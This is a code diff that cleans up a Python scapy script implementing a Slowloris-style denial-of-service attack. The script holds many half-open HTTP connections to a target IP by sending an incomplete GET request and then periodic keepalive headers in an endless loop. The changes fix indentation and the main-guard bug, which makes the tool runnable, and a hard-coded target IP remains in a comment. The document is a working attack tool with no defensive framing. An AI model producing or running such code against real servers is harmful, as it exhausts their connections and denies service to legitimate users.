@@ -21,13 +21,13 @@ parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to u
 parameters = parser.parse_args()
 
 if len(sys.argv) <= 1:
-	parser.print_help()
-	sys.exit(1)
+    parser.print_help()
+    sys.exit(1)
 
 if not parameters.host:
-	print("[-] Please specify the target IP address.")
-	parser.print_help()
-	sys.exit(1)
+    print("[-] Please specify the target IP address.")
+    parser.print_help()
+    sys.exit(1)
 
 get = ("GET /14 HTTP/1.1\r\n") # Incomplete GET
 keepalive_header = "X-a: {}\r\n".format(42).encode("utf-8") # Random number to keepalive
@@ -50,38 +50,37 @@ keepalive_header = "X-a: {}\r\n".format(42).encode("utf-8") # Random number to k
 def main():
     ip_address = parameters.host
     #ip_address = "35.204.165.14"
-    port = random.randint(1024,6000) # 4213 
+    port = random.randint(1024,6000) # 4213
     ip = IP(dst=ip_address)
     server_port = parameters.port
     list_size = parameters.sockets
     port_list = list(range(port, port + list_size))
-    print(port_list)
     seqAckList = [None] * list_size
     seqNumList = [None] * list_size
 
     # This will initialise each individual TCP socket
     print("[+] Initializing " + str(list_size)+ " Sockets")
     for p in range(list_size):
-	httpAck = httpRequest(ip_address,p+port)
-	seqAckList[p] = httpAck.ack
-	seqNumList[p] = httpAck.seq + utf8len(get)
-     
+        httpAck = httpRequest(ip_address,p+port)
+        seqAckList[p] = httpAck.ack
+        seqNumList[p] = httpAck.seq + utf8len(get)
+
     # This keeps refreshing HTTP connections
     # The acknowledgment numbers remain the same (no data being received from the server)
     # The sequence numbers keep being incremented by the size of the last payload
     while True:
-    	print("[+] Sending " + str(list_size) + " keepalive headers")
-	for p in range(list_size):
-		    ACK = ip/TCP(sport=port+p,
+        print("[+] Sending " + str(list_size) + " keepalive headers")
+        for p in range(list_size):
+            ACK = ip/TCP(sport=port+p,
 				 dport=server_port,
 				 flags="PA",
 				 ack=seqAckList[p],
 				 seq=seqNumList[p])
 
-		    DATA_SENT=ACK/keepalive_header
-		    send(DATA_SENT,verbose=False)
-		    seqNumList[p]+= utf8len(keepalive_header)
-	time.sleep(10)        
+            DATA_SENT=ACK/keepalive_header
+            send(DATA_SENT,verbose=False)
+            seqNumList[p]+= utf8len(keepalive_header)
+            time.sleep(10)
 
-if _name_ == "_main_":
-	main()
+if __name__ == "__main__":
+        main()
